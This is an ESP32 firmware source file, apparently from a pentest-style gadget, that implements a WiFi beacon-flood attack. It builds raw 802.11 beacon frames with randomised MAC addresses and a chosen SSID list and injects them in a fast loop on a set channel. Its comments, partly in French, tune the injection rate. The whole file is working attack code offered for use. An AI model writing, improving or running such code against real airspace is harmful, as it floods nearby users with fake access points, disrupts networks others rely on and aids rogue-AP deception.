#include "BFS.h"
#include "esp_rom_sys.h"   // esp_rom_delay_us

static const char* TAG = "BFS";

// Send Packet
extern esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool enq);

// Run the attack in freeRTOS task
static TaskHandle_t bfs_task_handle = NULL;

// Setup configuration
static bool wifi_was_promiscuous = false;
static wifi_mode_t original_mode = WIFI_MODE_NULL;
const bool wpa2 = true; // WPA2 networks

// Attack variables
static uint8_t attack_channel = -1;
static char ssids[MAX_SSID_BEACON][MAX_SSID_LENGTH];
static int current_ssid_count = 0;
uint8_t macAddr[6];

uint32_t packetSize = 0;
uint32_t packetCounter = 0;

// beacon frame definition
uint8_t beaconPacket[109] = {
  /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00, // Type/Subtype: managment beacon frame
  /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
  /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
  /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source (Router)

  // Fixed parameters
  /* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (will be done by the SDK)
  /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
  /* 32 - 33 */ 0x64, 0x00, // Interval: 100ms (meilleure visibilité des SSID)
  /* 34 - 35 */ 0x31, 0x00, // capabilities Tnformation

  // Tagged parameters

  // SSID parameters
  /* 36 - 37 */ 0x00, 0x20, // Tag: Set SSID length, Tag length: 32
  /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, // SSID

  // Supported Rates
  /* 70 - 71 */ 0x01, 0x08, // Tag: Supported Rates, Tag length: 8
  /* 72 */ 0x82, // 1(B)
  /* 73 */ 0x84, // 2(B)
  /* 74 */ 0x8b, // 5.5(B)
  /* 75 */ 0x96, // 11(B)
  /* 76 */ 0x24, // 18
  /* 77 */ 0x30, // 24
  /* 78 */ 0x48, // 36
  /* 79 */ 0x6c, // 54

  // Current Channel
  /* 80 - 81 */ 0x03, 0x01, // Channel set, length
  /* 82 */      0x01,       // Current Channel

  // RSN information
  /*  83 -  84 */ 0x30, 0x18,
  /*  85 -  86 */ 0x01, 0x00,
  /*  87 -  90 */ 0x00, 0x0f, 0xac, 0x02,
  /*  91 -  92 */ 0x02, 0x00,
  /*  93 - 100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04, /*Fix: changed 0x02(TKIP) to 0x04(CCMP) is default. WPA2 with TKIP not supported by many devices*/
  /* 101 - 102 */ 0x01, 0x00,
  /* 103 - 106 */ 0x00, 0x0f, 0xac, 0x02,
  /* 107 - 108 */ 0x00, 0x00
};

// Generate a ramdom mac
void generateRandomMac() {
    for(int i = 0; i<6; i++) {
        macAddr[i] = rand() % 256; // 0 to 256
    }
    // macAddr[0] &= 0xFE;  // unicast
    // macAddr[0] |= 0x02;  // locally administered
}

// Wrapper for beacon frame spam in a task function
static void bfs_task(void *vParameters) {
    bfs_attack(attack_channel);

    bfs_task_handle = NULL;
    vTaskDelete(NULL); // Delete the task when done
}

static void configure_ble_coexistence(void) {
    // BALANCE : rend de l'airtime au WiFi pour un débit de beacons correct,
    // tout en gardant le lien BLE. (PREFER_BT bridait fortement l'injection.)
    esp_coex_preference_set(ESP_COEX_PREFER_BALANCE);

    // Disable WiFi power saving to prevent conflicts
    esp_wifi_set_ps(WIFI_PS_NONE);

    ESP_LOGI(TAG, "BLE coexistence configured (BALANCE)");
}

// Save current WiFi state and switch to AP mode for beacon
static void prepare_for_beacon(void) {
    // Configure BLE protection FIRST
    configure_ble_coexistence();

    // Save current state
    esp_wifi_get_mode(&original_mode);
    wifi_was_promiscuous = false;
    
    // Check if promiscuous mode was enabled
    esp_wifi_get_promiscuous(&wifi_was_promiscuous);
    
    // Disable promiscuous mode
    if (wifi_was_promiscuous) {
        esp_wifi_set_promiscuous(false);
        ESP_LOGI(TAG, "Promiscuous mode disabled");
    }
    
    // Set to AP mode for packet injection
    esp_wifi_set_mode(WIFI_MODE_AP);
    
    // Set channel
    esp_wifi_set_channel(attack_channel, WIFI_SECOND_CHAN_NONE);
    
    ESP_LOGI(TAG, "WiFi switched to AP mode for beacon");
    vTaskDelay(pdMS_TO_TICKS(100));  // Let WiFi stabilize
}

// Restore original WiFi state
static void restore_wifi_state(void) {
    // Restore balanced coexistence
    esp_coex_preference_set(ESP_COEX_PREFER_BALANCE);

    // Restore original mode
    esp_wifi_set_mode(original_mode);
    
    // Re-enable promiscuous mode if it was on
    if (wifi_was_promiscuous) {
        esp_wifi_set_promiscuous(true);
        ESP_LOGI(TAG, "Promiscuous mode re-enabled");
    }
    
    // Restore channel
    esp_wifi_set_channel(attack_channel, WIFI_SECOND_CHAN_NONE);
    
    ESP_LOGI(TAG, "WiFi state restored");
}

void bfs_attack(int channel) {
    ESP_LOGI(TAG, "Starting beacon frame spam attack on channel=%d and ssids=%d",
        attack_channel, current_ssid_count);

    // Prepare WiFi for attack
    prepare_for_beacon();

    // Temp variables
    int index = 0;

    while(bfsActive) {

        if(current_ssid_count == 0) {
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }

        // Increment count
        index = (index + 1) % current_ssid_count;
        char *current_ssid = ssids[index];

        size_t ssidLen = strlen(current_ssid);
        if (ssidLen > MAX_SSID_LENGTH) ssidLen = MAX_SSID_LENGTH;

        // Generate a new mac
        generateRandomMac();

        // write MAC address into beacon frame
        memcpy(&beaconPacket[10], macAddr, 6);
        memcpy(&beaconPacket[16], macAddr, 6);

        // reset SSID
        memset(&beaconPacket[38], 0x00, 32);

        // Update SSID length
        beaconPacket[37] = ssidLen;

        // write new SSID into beacon frame
        memcpy(&beaconPacket[38], current_ssid, ssidLen);

        // Update channel tag
        beaconPacket[82] = channel;

        // Rafale rapide : 2 copies avec un gap fin, puis on passe au SSID
        // suivant. (Avant : 3 × 100 ms => ~10 beacons/s, bien trop lent.)
        for(int k = 0; k < 2; k++) {
            if (esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, packetSize, false) == ESP_OK) {
                packetCounter++;
            }
            esp_rom_delay_us(500);
        }

        // Yield 1 tick par SSID pour nourrir watchdog + pile BLE
        vTaskDelay(pdMS_TO_TICKS(1));

        // Log périodique léger (pas à chaque paquet)
        if ((packetCounter % 200) == 0) {
            ESP_LOGI(TAG, "BFS: %lu beacons envoyés", (unsigned long)packetCounter);
        }
    }

    // Handle attackInProgress variable for blinking
    isAttackActive = false;

    // Restore original WiFi state
    vTaskDelay(pdMS_TO_TICKS(200));
    restore_wifi_state();

    ESP_LOGI(TAG, "BFS attack stopped");
}

void start_beacon_spam(int channel, char** ssid_list, int ssid_count){
    if(bfsActive) {
        ESP_LOGW(TAG, "BFS already running");
        return;
    }

    if(bfs_task_handle != NULL) {
        ESP_LOGW(TAG, "BFS task already exists");
        return;
    }

    // set packetSize
    packetSize = sizeof(beaconPacket);
    if (wpa2) {
        beaconPacket[34] = 0x31;
    } else {
        beaconPacket[34] = 0x21;
        packetSize -= 26;
    }

    // Set seed for random generator
    srand(time(NULL));

    ESP_LOGI(TAG, "Starting beacon spam: CHANNEL=%d, SSIDs=%d", channel, ssid_count);

    // set target channel
    set_bfs_channel(channel);
    // set ssid list
    set_bfs_ssid_list(ssid_list, ssid_count);

    bfsActive = true;
    isAttackActive = true;

    // Calling task freeRTOS
    xTaskCreate(
        bfs_task,
        "bfs_task",
        4096,
        NULL,
        5, // Priority less than ble
        &bfs_task_handle
    );

    ESP_LOGI(TAG, "BFS task created");
}

void stop_beacon_spam() {
    if(!bfsActive) return;

    // Arrêt coopératif : la tâche sort de sa boucle (bfsActive) et se nettoie
    // elle-même. Plus de vTaskDelete en plein esp_wifi_80211_tx.
    bfsActive = false;

    ESP_LOGI(TAG, "Stopping bfs attack (cooperative)...");

    int wait_count = 0;
    while (bfs_task_handle != NULL && wait_count < 50) {
        vTaskDelay(pdMS_TO_TICKS(100));
        wait_count++;
    }

    // Filet de sécurité si la tâche est réellement bloquée
    if (bfs_task_handle != NULL) {
        ESP_LOGW(TAG, "BFS task did not exit in time, forcing cleanup");
        vTaskDelete(bfs_task_handle);
        bfs_task_handle = NULL;
        restore_wifi_state();
    }

    ESP_LOGI(TAG, "BFS STOPPED");

    return;
}

void set_bfs_channel(const uint8_t channel) {
    attack_channel = channel;
    ESP_LOGI(TAG, "BFS channel set to %d", channel);
}

void set_bfs_ssid_list(char** ssid_list, int ssid_count) {
    if(ssid_list == NULL || ssid_count <= 0) {
        ESP_LOGW(TAG, "Invalid SSID list");
        return;
    }

    if(ssid_count > MAX_SSID_BEACON) {
        ssid_count = MAX_SSID_BEACON;
    }

    current_ssid_count = ssid_count;

    for(int i = 0; i<current_ssid_count; i++) {
        if(ssid_list[i] != NULL) {
            strncpy(ssids[i], ssid_list[i], MAX_SSID_LENGTH - 1);
            ssids[i][MAX_SSID_LENGTH - 1] = '\0';
        } else {
            ssids[i][0] = '\0';
        }
    }

    ESP_LOGI(TAG, "Copied %d SSIDs into internal buffer", current_ssid_count);
}